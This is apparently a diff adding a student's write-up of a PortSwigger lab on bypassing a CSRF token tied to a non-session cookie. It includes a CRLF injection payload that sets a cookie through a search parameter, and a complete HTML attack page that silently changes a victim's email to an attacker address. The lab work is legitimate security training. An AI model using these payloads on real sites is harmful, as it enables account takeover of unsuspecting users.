@@ -1,0 +1,47 @@
+CSRF where token is tied to non-session cookie: Bypass with CRLF Injection
+
+**Lab URL**: (https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie)  
+**Category**: CSRF  
+**Difficulty**: Practitioner  
+
+---
+
+## Overview / What I Learned
+
+- This lab explores how improper implementation of CSRF token storage leads to vulnerabilities.
+- Specifically, the CSRF token is stored in a cookie that is **not tied to the user's session**, making it reusable across users.
+- I learned how **CRLF injection** can be used to overwrite cookies in the victim's browser, allowing the attacker to force the CSRF token to a known value.
+
+---
+
+## Exploit Steps / Attack Methodology
+
+### 1. Initial Analysis
+- **Tools Used**: Burp Suite, Firefox Dev Tools
+- Navigated to the email change page and intercepted the POST request. It included a `csrf` token stored in a cookie named `csrfKey`.
+- Confirmed that the token was checked server-side and matched against the cookie, **but not tied to any session**.
+
+### 2. Search Endpoint Vulnerability
+- The `/?search=` endpoint was vulnerable to **CRLF injection**.
+- Payload used: `test%0d%0aSet-Cookie:%20csrfKey=knownvalue;%20SameSite=None`
+
+### 3. Exploit Development
+- Used this vulnerability to set the `csrfKey` in the victim’s browser via a malicious search request.
+- Crafted a CSRF attack page that:
+  - First loaded the injected URL via an `<iframe>`
+  - Then triggered a form submission using a known `csrfKey`
+
+### 4. Payload Used
+```html
+<html>
+  <body>
+    <iframe src="https://TARGET/?search=test%0d%0aSet-Cookie:%20csrfKey=knownvalue;%20SameSite=None" onload="
+      document.forms[0].submit();
+    "></iframe>
+
+    <form action="https://TARGET/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="attacker@evil.com" />
+      <input type="hidden" name="csrf" value="knownvalue" />
+    </form>
+  </body>
+</html>
